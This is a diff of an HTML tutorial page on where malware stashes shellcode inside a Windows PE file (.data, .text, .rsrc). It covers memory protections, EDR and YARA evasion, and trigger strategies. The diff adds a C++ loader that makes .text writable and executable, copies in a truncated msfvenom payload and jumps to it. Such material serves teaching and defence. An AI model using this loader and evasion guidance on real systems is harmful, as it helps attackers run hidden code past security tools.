@@ -28,11 +28,11 @@
         <p class="pl-2 font-bold">Four Most Common Sections for Payload Stashing: </p>
         <ul class="list-disc list-outside pl-6 text-gray-300">
           <li><strong><code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">.data</code>:</strong>
-              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Default Memory Protection:</strong> RW (read/write) unless the image is built with /NXCOMPAT, in which case <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">DEP</code> blocks execution. </p></li>
+              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Default Memory Protection:</strong> RW (read/write) unless the image is built with /NXCOMPAT, in which case <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">DEP/CFG</code> blocks execution. </p></li>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Legitimate Purpose:</strong> Global or static variables that change at run-time. </p>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Will shellcode run straight from it?</strong> No, <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">DEP</code> marks it non-executable. </p>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Why Offenders Like It:</strong> Its easy any writable global drops here automatically. Attackers can embed an encrypted blob, decrypt it at start-up, then copy it elsewhere for execution. </p>
-              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Trade-offs & notes:</strong> RW → RX generate the noisiest telemetry (EDR hooks, ETW). Encrypting the payload in <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">.data</code> mitigates static YARA hits, but the protection flip remains loud. </p>
+              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Trade-offs & notes:</strong> <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">RW → RX</code> generate the noisiest telemetry (EDR hooks, ETW). Encrypting the payload in <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">.data</code> mitigates static YARA hits, but the protection flip remains loud. </p>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Typical trigger strategy:</strong> <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">VirtualProtect</code>/<code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtProtectVirtualMemory</code> to flip the page to <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">RWX</code>, then cast a delegate. Also, Copy the bytes to a fresh <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">VirtualAlloc</code> region created <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">RWX</code> and jump there.</p>
               <div class="mt-6"></div>
           <li><strong><code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">.rdata</code>:</strong>
@@ -47,10 +47,97 @@
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Default Memory Protection:</strong> RX (read + execute) </p></li>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Legitimate Purpose:</strong> Compiled program instructions. </p>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Will shellcode run straight from it?</strong> Yes, it’s already executable. </p>
-              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Why Offenders Like It:</strong> Already executable, so no permission change is necessary. Static scanners will see the raw bytes, so adversaries encrypt or pack them to stay under the radar. </p>
+              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Why Offenders Like It:</strong> Since its already executable, so no permission change is necessary. However, static scanners will see the raw bytes, so adversaries encrypt or pack them to stay under the radar.</p>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Trade-offs & notes:</strong> Direct execution leaves raw opcodes visible on disk; static scanners catch this unless you pack/encrypt the section and decrypt at run-time. </p>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Typical trigger strategy:</strong> Call a function pointer to the payload bytes, Overwrite an existing function prologue to branch into the blob, and Abuse a <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">TLS callback</code> or delay-load thunk to point at the blob </p>
-              <div class="mt-6"></div>
+              <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- To achieve this, the program must:</strong> </p>
+              <ol class="list-[upper-alpha] list-outside pl-10 text-gray-300 text-[15px] leading-relaxed sm:text-justify">
+                <li>Modify memory protections using<code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">VirtualProtect</code></li>
+                <li>Calculate the base address and locate the <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">.text</code> section.</li>
+                <li>Write the payload.</li>
+                <li>Optionally: execute the payload.</li>
+              </ol>
+              <style>
+                pre 
+                {
+                  background-color: #334155;
+                  color: #dcdcdc;
+                  font-family: Consolas, monospace;
+                  overflow-x: auto;
+                }
+                summary 
+                {
+                  font-size: 1.1em;
+                  font-weight: bold;
+                  cursor: pointer;
+                  padding: 10px;
+                }                
+              </style>              
+              <details>
+                <summary class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2">Click here to see a simple C++ project</summary>
+                <pre><code class="language-cpp">
+                  #include &lt;Windows.h&gt;
+                  #include &lt;iostream&gt;
+
+                  #pragma comment(lib, "kernel32.lib")
+
+                  // Dummy payload: msfvenom -p windows/x64/exec CMD=calc.exe -f c
+                  unsigned char payload[] = {
+                      0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, ...
+                  };
+
+                  // Get base address of current module
+                  PBYTE GetBaseAddress() {
+                      return reinterpret_cast&lt;PBYTE&gt;(GetModuleHandle(nullptr));
+                  }
+
+                  // Locate .text section
+                  bool FindTextSection(PBYTE base, PBYTE&amp; textStart, DWORD&amp; textSize) {
+                      PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+                      PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos-&gt;e_lfanew);
+                      PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+
+                      for (int i = 0; i &lt; nt-&gt;FileHeader.NumberOfSections; ++i, ++section) {
+                          if (memcmp(section-&gt;Name, ".text", 5) == 0) {
+                              textStart = base + section-&gt;VirtualAddress;
+                              textSize = section-&gt;Misc.VirtualSize;
+                              return true;
+                          }
+                      }
+                      return false;
+                  }
+
+                  int main() {
+                      PBYTE base = GetBaseAddress();
+                      PBYTE textSection = nullptr;
+                      DWORD textSize = 0;
+
+                      if (!FindTextSection(base, textSection, textSize)) {
+                          std::cerr &lt;&lt; "Failed to locate .text section\n";
+                          return -1;
+                      }
+
+                      std::cout &lt;&lt; "[+] .text section found at: " &lt;&lt; (void*)textSection &lt;&lt; "\n";
+
+                      DWORD oldProtect;
+                      if (!VirtualProtect(textSection, textSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) {
+                          std::cerr &lt;&lt; "Failed to change protection\n";
+                          return -2;
+                      }
+
+                      std::cout &lt;&lt; "[+] Writing payload...\n";
+                      memcpy(textSection, payload, sizeof(payload));
+
+                      VirtualProtect(textSection, textSize, oldProtect, &amp;oldProtect);
+
+                      std::cout &lt;&lt; "[+] Jumping to payload...\n";
+                      ((void(*)())textSection)();
+
+                      return 0;
+                    }
+                    
+                </code></pre>
+              </details>
           <li><strong><code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">.rsrc</code> information:</strong>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Default Memory Protection:</strong> R (read-only, data only) </p></li>
               <p class="text-[15px] text-gray-300 leading-relaxed sm:text-justify pl-2"> <strong>- Legitimate Purpose:</strong> Icons, dialogs, version info, arbitrary resources. </p>
